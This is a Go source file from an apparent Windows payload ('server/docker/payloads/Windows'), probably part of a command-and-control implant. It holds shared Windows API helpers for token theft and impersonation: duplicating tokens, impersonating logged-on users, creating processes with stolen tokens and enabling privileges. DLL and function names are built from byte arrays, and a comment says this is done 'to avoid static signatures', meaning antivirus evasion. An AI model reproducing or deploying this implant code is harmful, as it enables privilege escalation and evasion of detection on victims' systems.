// server/docker/payloads/Windows/windows_common.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// Windows API constants - Token Access Rights
const (
	TOKEN_QUERY             = 0x0008
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY_SOURCE      = 0x0010
	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_ALL_ACCESS        = 0xF01FF
	MAXIMUM_ALLOWED         = 0x2000000
)

// Windows API constants - Process Access Rights
const (
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_ALL_ACCESS        = 0x1F0FFF
)

// Windows API constants - Security
const (
	SecurityImpersonation = 2
	TokenPrimary          = 1
	TokenImpersonation    = 2
)

// Windows API constants - Process Creation
const (
	CREATE_NO_WINDOW           = 0x08000000
	CREATE_UNICODE_ENVIRONMENT = 0x00000400
	CREATE_NEW_CONSOLE         = 0x00000010
	CREATE_NEW_PROCESS_GROUP   = 0x00000200
	CREATE_SUSPENDED           = 0x00000004
	STARTF_USESHOWWINDOW       = 0x00000001
	STARTF_USESTDHANDLES       = 0x00000100
	SW_SHOW                    = 5
	SW_HIDE                    = 0
)

// Windows API constants - Tool Help
const (
	TH32CS_SNAPPROCESS = 0x00000002
	TH32CS_SNAPTHREAD  = 0x00000004
	TH32CS_SNAPMODULE  = 0x00000008
	MAX_PATH           = 260
)

// Windows API constants - Logon Types
const (
	LOGON32_LOGON_INTERACTIVE       = 2
	LOGON32_LOGON_NETWORK           = 3
	LOGON32_LOGON_BATCH             = 4
	LOGON32_LOGON_SERVICE           = 5
	LOGON32_LOGON_NETWORK_CLEARTEXT = 8
	LOGON32_LOGON_NEW_CREDENTIALS   = 9

	LOGON32_PROVIDER_DEFAULT = 0
	LOGON32_PROVIDER_WINNT50 = 3
)

// Windows API constants - Privileges
const (
	SE_PRIVILEGE_ENABLED = 0x00000002
)

// Windows API strings (constructed to avoid static signatures)
var (
	// DLL names
	wcDllAdvapi32 = string([]byte{0x61, 0x64, 0x76, 0x61, 0x70, 0x69, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                       // advapi32.dll
	wcDllKernel32 = string([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                       // kernel32.dll
	wcDllNtdll    = string([]byte{0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                                         // ntdll.dll
	wcDllUser32   = string([]byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                                   // user32.dll
	wcDllPsapi    = string([]byte{0x70, 0x73, 0x61, 0x70, 0x69, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                                         // psapi.dll

	// Advapi32 function names
	wcFnGetUserNameW              = string([]byte{0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x4e, 0x61, 0x6d, 0x65, 0x57})                                                                                       // GetUserNameW
	wcFnOpenProcessToken          = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6f, 0x6b, 0x65, 0x6e})                                                               // OpenProcessToken
	wcFnOpenThreadToken           = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x54, 0x6f, 0x6b, 0x65, 0x6e})                                                                     // OpenThreadToken
	wcFnDuplicateTokenEx          = string([]byte{0x44, 0x75, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x45, 0x78})                                                               // DuplicateTokenEx
	wcFnImpersonateLoggedOnUser   = string([]byte{0x49, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x65, 0x4c, 0x6f, 0x67, 0x67, 0x65, 0x64, 0x4f, 0x6e, 0x55, 0x73, 0x65, 0x72})                     // ImpersonateLoggedOnUser
	wcFnRevertToSelf              = string([]byte{0x52, 0x65, 0x76, 0x65, 0x72, 0x74, 0x54, 0x6f, 0x53, 0x65, 0x6c, 0x66})                                                                                       // RevertToSelf
	wcFnGetTokenInformation       = string([]byte{0x47, 0x65, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e})                                             // GetTokenInformation
	wcFnLookupAccountSidW         = string([]byte{0x4c, 0x6f, 0x6f, 0x6b, 0x75, 0x70, 0x41, 0x63, 0x63, 0x6f, 0x75, 0x6e, 0x74, 0x53, 0x69, 0x64, 0x57})                                                         // LookupAccountSidW
	wcFnLogonUserW                = string([]byte{0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x55, 0x73, 0x65, 0x72, 0x57})                                                                                                   // LogonUserW
	wcFnLogonUserExW              = string([]byte{0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x55, 0x73, 0x65, 0x72, 0x45, 0x78, 0x57})                                                                                       // LogonUserExW
	wcFnCreateProcessAsUserW      = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x41, 0x73, 0x55, 0x73, 0x65, 0x72, 0x57})                                       // CreateProcessAsUserW
	wcFnCreateProcessWithTokenW   = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x57, 0x69, 0x74, 0x68, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x57})                     // CreateProcessWithTokenW
	wcFnAdjustTokenPrivileges     = string([]byte{0x41, 0x64, 0x6a, 0x75, 0x73, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x73})                                 // AdjustTokenPrivileges
	wcFnLookupPrivilegeValueW     = string([]byte{0x4c, 0x6f, 0x6f, 0x6b, 0x75, 0x70, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x57})                                 // LookupPrivilegeValueW

	// Kernel32 function names
	wcFnOpenProcess              = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                                                             // OpenProcess
	wcFnCloseHandle              = string([]byte{0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                                                             // CloseHandle
	wcFnGetCurrentProcess        = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                         // GetCurrentProcess
	wcFnGetCurrentProcessId      = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64})                                             // GetCurrentProcessId
	wcFnGetCurrentThread         = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                               // GetCurrentThread
	wcFnTerminateProcess         = string([]byte{0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                               // TerminateProcess
	wcFnGetExitCodeProcess       = string([]byte{0x47, 0x65, 0x74, 0x45, 0x78, 0x69, 0x74, 0x43, 0x6f, 0x64, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                   // GetExitCodeProcess
	wcFnWaitForSingleObject      = string([]byte{0x57, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x53, 0x69, 0x6e, 0x67, 0x6c, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74})                                             // WaitForSingleObject
	wcFnCreateToolhelp32Snapshot = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70, 0x33, 0x32, 0x53, 0x6e, 0x61, 0x70, 0x73, 0x68, 0x6f, 0x74})               // CreateToolhelp32Snapshot
	wcFnProcess32FirstW          = string([]byte{0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0x57})                                                                     // Process32FirstW
	wcFnProcess32NextW           = string([]byte{0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x4e, 0x65, 0x78, 0x74, 0x57})                                                                           // Process32NextW
	wcFnGetEnvironmentStringsW   = string([]byte{0x47, 0x65, 0x74, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57})                           // GetEnvironmentStringsW
	wcFnFreeEnvironmentStringsW  = string([]byte{0x46, 0x72, 0x65, 0x65, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57})                     // FreeEnvironmentStringsW
)

// Windows API DLLs
var (
	modAdvapi32 = syscall.NewLazyDLL(wcDllAdvapi32)
	modKernel32 = syscall.NewLazyDLL(wcDllKernel32)
	modNtdll    = syscall.NewLazyDLL(wcDllNtdll)
	modUser32   = syscall.NewLazyDLL(wcDllUser32)
	modPsapi    = syscall.NewLazyDLL(wcDllPsapi)
)

// Windows API functions - Token Management
var (
	procGetUserNameW            = modAdvapi32.NewProc(wcFnGetUserNameW)
	procOpenProcessToken        = modAdvapi32.NewProc(wcFnOpenProcessToken)
	procOpenThreadToken         = modAdvapi32.NewProc(wcFnOpenThreadToken)
	procDuplicateTokenEx        = modAdvapi32.NewProc(wcFnDuplicateTokenEx)
	procImpersonateLoggedOnUser = modAdvapi32.NewProc(wcFnImpersonateLoggedOnUser)
	procRevertToSelf            = modAdvapi32.NewProc(wcFnRevertToSelf)
	procGetTokenInformation     = modAdvapi32.NewProc(wcFnGetTokenInformation)
	procLookupAccountSidW       = modAdvapi32.NewProc(wcFnLookupAccountSidW)
	procLogonUserW              = modAdvapi32.NewProc(wcFnLogonUserW)
	procLogonUserExW            = modAdvapi32.NewProc(wcFnLogonUserExW)
	procCreateProcessAsUserW    = modAdvapi32.NewProc(wcFnCreateProcessAsUserW)
	procCreateProcessWithTokenW = modAdvapi32.NewProc(wcFnCreateProcessWithTokenW)
	procAdjustTokenPrivileges   = modAdvapi32.NewProc(wcFnAdjustTokenPrivileges)
	procLookupPrivilegeValueW   = modAdvapi32.NewProc(wcFnLookupPrivilegeValueW)
)

// Windows API functions - Process Management
var (
	procOpenProcess              = modKernel32.NewProc(wcFnOpenProcess)
	procCloseHandle              = modKernel32.NewProc(wcFnCloseHandle)
	procGetCurrentProcess        = modKernel32.NewProc(wcFnGetCurrentProcess)
	procGetCurrentProcessId      = modKernel32.NewProc(wcFnGetCurrentProcessId)
	procGetCurrentThread         = modKernel32.NewProc(wcFnGetCurrentThread)
	procTerminateProcess         = modKernel32.NewProc(wcFnTerminateProcess)
	procGetExitCodeProcess       = modKernel32.NewProc(wcFnGetExitCodeProcess)
	procWaitForSingleObject      = modKernel32.NewProc(wcFnWaitForSingleObject)
	procCreateToolhelp32Snapshot = modKernel32.NewProc(wcFnCreateToolhelp32Snapshot)
	procProcess32FirstW          = modKernel32.NewProc(wcFnProcess32FirstW)
	procProcess32NextW           = modKernel32.NewProc(wcFnProcess32NextW)
)

// Windows API functions - Environment
var (
	procGetEnvironmentStringsW  = modKernel32.NewProc(wcFnGetEnvironmentStringsW)
	procFreeEnvironmentStringsW = modKernel32.NewProc(wcFnFreeEnvironmentStringsW)
)

// PROCESSENTRY32 structure for process enumeration
type PROCESSENTRY32 struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriorityClassBase int32
	Flags             uint32
	ExeFile           [MAX_PATH]uint16
}

// TokenUser structure for GetTokenInformation
type TokenUser struct {
	User SIDAndAttributes
}

type SIDAndAttributes struct {
	Sid        *syscall.SID
	Attributes uint32
}

// STARTUPINFO structure for process creation
type STARTUPINFO struct {
	Cb            uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	CbReserved2   uint16
	LpReserved2   *byte
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
}

// PROCESS_INFORMATION structure for process creation
type PROCESS_INFORMATION struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

// Privilege structures
type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

// Common Windows API wrapper functions

// GetCurrentProcess returns a pseudo handle to the current process
func GetCurrentProcess() syscall.Handle {
	ret, _, _ := procGetCurrentProcess.Call()
	return syscall.Handle(ret)
}

// GetCurrentThread returns a pseudo handle to the current thread
func GetCurrentThread() syscall.Handle {
	ret, _, _ := procGetCurrentThread.Call()
	return syscall.Handle(ret)
}

// OpenProcess opens a handle to a process
func OpenProcess(desiredAccess uint32, inheritHandle bool, processId uint32) (syscall.Handle, error) {
	inherit := uint32(0)
	if inheritHandle {
		inherit = 1
	}

	ret, _, err := procOpenProcess.Call(
		uintptr(desiredAccess),
		uintptr(inherit),
		uintptr(processId),
	)

	if ret == 0 {
		return 0, err
	}

	return syscall.Handle(ret), nil
}

// OpenProcessToken opens a process token
func OpenProcessToken(process syscall.Handle, access uint32, token *syscall.Token) error {
	ret, _, err := procOpenProcessToken.Call(
		uintptr(process),
		uintptr(access),
		uintptr(unsafe.Pointer(token)),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// OpenThreadToken opens a thread token
func OpenThreadToken(thread syscall.Handle, access uint32, openAsSelf bool, token *syscall.Token) error {
	var openAsSelfVal uint32
	if openAsSelf {
		openAsSelfVal = 1
	}

	ret, _, err := procOpenThreadToken.Call(
		uintptr(thread),
		uintptr(access),
		uintptr(openAsSelfVal),
		uintptr(unsafe.Pointer(token)),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// DuplicateTokenEx duplicates a token
func DuplicateTokenEx(existingToken syscall.Handle, desiredAccess uint32, tokenAttributes *syscall.SecurityAttributes, impersonationLevel uint32, tokenType uint32, newToken *syscall.Handle) error {
	ret, _, err := procDuplicateTokenEx.Call(
		uintptr(existingToken),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(tokenAttributes)),
		uintptr(impersonationLevel),
		uintptr(tokenType),
		uintptr(unsafe.Pointer(newToken)),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// ImpersonateLoggedOnUser impersonates a token
func ImpersonateLoggedOnUser(token syscall.Handle) error {
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(token))
	if ret == 0 {
		return err
	}
	return nil
}

// RevertToSelf reverts impersonation
func RevertToSelf() error {
	ret, _, err := procRevertToSelf.Call()
	if ret == 0 {
		return err
	}
	return nil
}

// CloseHandle closes a Windows handle
func CloseHandle(handle syscall.Handle) {
	if handle != 0 && handle != syscall.InvalidHandle {
		procCloseHandle.Call(uintptr(handle))
	}
}

// GetCurrentProcessId returns the current process ID
func GetCurrentProcessId() uint32 {
	ret, _, _ := procGetCurrentProcessId.Call()
	return uint32(ret)
}

// TerminateProcess terminates a process
func TerminateProcess(process syscall.Handle, exitCode uint32) error {
	ret, _, err := procTerminateProcess.Call(
		uintptr(process),
		uintptr(exitCode),
	)
	if ret == 0 {
		return err
	}
	return nil
}

// GetExitCodeProcess gets the exit code of a process
func GetExitCodeProcess(process syscall.Handle, exitCode *uint32) error {
	ret, _, err := procGetExitCodeProcess.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(exitCode)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

// WaitForSingleObject waits for an object to be signaled
func WaitForSingleObject(handle syscall.Handle, milliseconds uint32) (uint32, error) {
	ret, _, err := procWaitForSingleObject.Call(
		uintptr(handle),
		uintptr(milliseconds),
	)
	if ret == 0xFFFFFFFF { // WAIT_FAILED
		return 0, err
	}
	return uint32(ret), nil
}

// EnablePrivilege enables a privilege in the current process token
func EnablePrivilege(privilegeName string) error {
	// Get current process token
	var token syscall.Token
	err := OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf(ErrCtx(E3, err.Error()))
	}
	defer token.Close()

	// Convert privilege name to UTF16
	privNameUTF16, err := syscall.UTF16PtrFromString(privilegeName)
	if err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Look up privilege LUID
	var luid LUID
	ret, _, err := procLookupPrivilegeValueW.Call(
		0, // lpSystemName (NULL = local)
		uintptr(unsafe.Pointer(privNameUTF16)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf(ErrCtx(E4, err.Error()))
	}

	// Enable the privilege
	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0, // DisableAllPrivileges = FALSE
		uintptr(unsafe.Pointer(&tp)),
		uintptr(unsafe.Sizeof(tp)),
		0, // PreviousState
		0, // ReturnLength
	)
	if ret == 0 {
		return fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	return nil
}
